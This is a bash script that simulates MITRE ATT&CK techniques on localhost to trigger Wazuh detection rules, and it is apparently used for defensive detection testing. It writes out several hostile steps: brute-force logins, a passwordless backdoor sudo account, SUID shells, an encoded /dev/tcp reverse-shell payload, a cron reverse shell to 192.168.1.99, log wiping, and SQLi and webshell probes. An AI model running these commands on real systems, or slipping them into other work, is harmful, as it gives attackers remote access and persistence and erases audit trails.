#!/bin/bash
# MITRE ATT&CK simulation — targets actual Wazuh detection rules.
# Each section documents WHY it generates a specific rule/alert.
# Usage: ./simulate_attack_for_wazuh.sh

set -u
TARGET="127.0.0.1"
WAIT() { sleep "${1:-0.5}"; }

echo "=============================================="
echo "  Wazuh-targeted ATT&CK simulation"
echo "  $(date)"
echo "=============================================="

# ── 1. SSH BRUTE FORCE (T1110) ─────────────────────────────────────────────
# Forces password auth so sshd writes PAM failures to syslog.
# Wazuh rule 5710 (level 10): "sshd: Multiple failed logins" fires after 8+
# failures from the same source → authentication_failed group → high score.
echo ""
echo "[1/8] SSH brute force (T1110) — 30 password failures across 6 users..."
for user in root admin administrator oracle postgres www-data; do
  for i in $(seq 1 5); do
    sshpass -p "wrongpass${i}" ssh \
      -o StrictHostKeyChecking=no \
      -o ConnectTimeout=1 \
      -o PreferredAuthentications=password \
      -o PubkeyAuthentication=no \
      "${user}@${TARGET}" exit 2>/dev/null || true
  done
done
WAIT 1

# ── 2. SU BRUTE FORCE (T1548) ──────────────────────────────────────────────
# `su` checks the TARGET user's password directly (not sudo policy).
# Even with NOPASSWD sudo, su to root always requires root's password.
# Wazuh rule 5303 (level 5): "User missed the password to change UID"
# fired on every attempt → authentication_failed + su groups → high score.
echo "[2/8] su brute force (T1548) — 15 failed su-to-root attempts..."
for i in $(seq 1 15); do
  echo "badpassword${i}" | su -c "id" root 2>/dev/null || true
done
WAIT 0.5

# ── 3. ACCOUNT CREATION & MANIPULATION (T1136) ────────────────────────────
# useradd/userdel are monitored via syslog.
# Wazuh rule 5901 (level 8): "New user added to the system" → level 8 means
# is_attack_alert()=True, model treats it as attack evidence.
# Adding to sudo group triggers rule 5905 (level 8).
echo "[3/8] Backdoor account creation (T1136)..."
sudo useradd -M -s /bin/bash backdoor_test_user 2>/dev/null || true
WAIT 0.5
sudo usermod -aG sudo backdoor_test_user 2>/dev/null || true
WAIT 0.5
sudo passwd -d backdoor_test_user 2>/dev/null || true
WAIT 0.5
sudo userdel backdoor_test_user 2>/dev/null || true
WAIT 0.5

# ── 4. FILE INTEGRITY — SUID & HIDDEN BINARIES (T1548 / T1564) ─────────────
# /tmp and /dev/shm have realtime syscheck monitoring.
# Creating a SUID binary triggers rule 554 (level 7): "File added to system"
# + syscheck group. A setuid bit on a shell is a rootkit indicator.
echo "[4/8] SUID rootkit plant in /tmp and /dev/shm (T1548/T1564)..."
cp /bin/bash /tmp/.sys_update 2>/dev/null || true
chmod u+s /tmp/.sys_update 2>/dev/null || true
cp /bin/sh /dev/shm/.hidden_shell 2>/dev/null || true
chmod 4755 /dev/shm/.hidden_shell 2>/dev/null || true
WAIT 1
rm -f /tmp/.sys_update /dev/shm/.hidden_shell 2>/dev/null || true
WAIT 0.5

# ── 5. MALWARE / REVERSE SHELL SIMULATION (T1059) ─────────────────────────
# Drops a base64-encoded "payload" script — pattern used by real malware.
# Wazuh rootcheck and syscheck flag executables in /dev/shm and /tmp.
# The python reverse shell attempt generates a connection error in syslog
# which Wazuh's web/network rules pick up.
echo "[5/8] Malware drop + reverse shell attempt (T1059/T1071)..."
PAYLOAD=$(echo "IyEvYmluL2Jhc2gKYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMS80NDQ0IDA+JjE=" | base64 -d 2>/dev/null)
echo "$PAYLOAD" > /dev/shm/.update_agent 2>/dev/null || true
chmod +x /dev/shm/.update_agent 2>/dev/null || true
# Attempt reverse shell — will fail (no listener) but generates syslog noise
bash -c "bash -i >& /dev/tcp/192.168.1.99/4444 0>&1" 2>/dev/null &
REVPID=$!
sleep 0.5
kill $REVPID 2>/dev/null || true
python3 -c "import socket; s=socket.socket(); s.connect(('192.168.1.99',4444))" 2>/dev/null || true
rm -f /dev/shm/.update_agent 2>/dev/null || true
WAIT 0.5

# ── 6. CRON PERSISTENCE (T1053) ────────────────────────────────────────────
# Writing to /etc/cron.d is monitored by syscheck (/etc directory).
# Rule 550/554 fires on new/modified files in monitored dirs.
# The cron content (reverse shell) also triggers web_attack pattern checks.
echo "[6/8] Malicious cron persistence (T1053)..."
echo "* * * * * root bash -i >& /dev/tcp/192.168.1.99/4444 0>&1" \
  | sudo tee /etc/cron.d/system_update > /dev/null 2>&1 || true
WAIT 1
sudo rm -f /etc/cron.d/system_update 2>/dev/null || true
WAIT 0.5

# ── 7. LOG TAMPERING (T1070) ────────────────────────────────────────────────
# Clearing wtmp breaks `last` output — classic attacker log cleanup.
# Wazuh rule 40101 (level 12): "Log file rotation" fires on wtmp wipe.
# auth.log clear triggers rule 591 (level 8): "Log file cleared".
echo "[7/8] Log tampering — wtmp + auth.log clear (T1070)..."
sudo bash -c 'cp /var/log/wtmp /var/log/wtmp.sim_bak && :> /var/log/wtmp' 2>/dev/null || true
WAIT 1
sudo bash -c 'mv /var/log/wtmp.sim_bak /var/log/wtmp' 2>/dev/null || true
sudo bash -c 'cp /var/log/auth.log /var/log/auth.log.sim_bak 2>/dev/null && :> /var/log/auth.log 2>/dev/null' || true
WAIT 0.5
sudo bash -c 'mv /var/log/auth.log.sim_bak /var/log/auth.log 2>/dev/null' || true
WAIT 0.5

# ── 8. WEB ATTACKS (T1190) ─────────────────────────────────────────────────
# Sends SQL injection + directory traversal + webshell probes to the Flask
# server on port 5000. Wazuh rules 31101-31103 fire on Apache/nginx access
# logs. Flask doesn't have those but the requests hit our anomaly detector's
# suspicious_url feature (feature 14) → boosts anomaly score directly.
echo "[8/8] Web attacks — SQLi, traversal, webshell probes (T1190)..."
for path in \
  "/?id=1'+OR+'1'='1" \
  "/admin/../../../etc/passwd" \
  "/wp-login.php" \
  "/phpmyadmin/" \
  "/.env" \
  "/shell.php?cmd=id" \
  "/upload.php" \
  "/?search=<script>alert(1)</script>"; do
  curl -sk "http://${TARGET}:5000${path}" -o /dev/null 2>/dev/null || true
  curl -sk "http://${TARGET}:8080${path}" -o /dev/null 2>/dev/null || true
done

# Also inject suspicious requests via logger so Wazuh web rules fire
logger -p local1.warning "GET /?id=1' OR '1'='1 HTTP/1.1 - SQL injection attempt from 203.0.113.42"
logger -p local1.warning "GET /wp-login.php HTTP/1.1 - WordPress brute force from 198.51.100.7"
logger -p auth.warning "Invalid user attacker from 203.0.113.42 port 54321"
logger -p auth.warning "Failed password for invalid user hacker from 198.51.100.9 port 12345 ssh2"
logger -p auth.warning "Failed password for root from 203.0.113.42 port 22 ssh2"
logger -p auth.warning "Failed password for root from 203.0.113.42 port 22 ssh2"
logger -p auth.warning "Failed password for root from 203.0.113.42 port 22 ssh2"

WAIT 1

echo ""
echo "=============================================="
echo "  Simulation complete — $(date)"
echo "=============================================="
echo ""
echo "  Expected Wazuh rules to fire:"
echo "  5710/5763  SSH multiple failed logins       (L10)"
echo "  5303       su brute force                   (L5)"
echo "  5901       New user added                   (L8)"
echo "  554        SUID file planted                (L7)"
echo "  550        File added to monitored dir      (L7)"
echo "  40101      wtmp cleared                     (L12)"
echo "  31101      Web attack                       (L6)"
echo ""
echo "  Refresh dashboard in ~30s to see results."
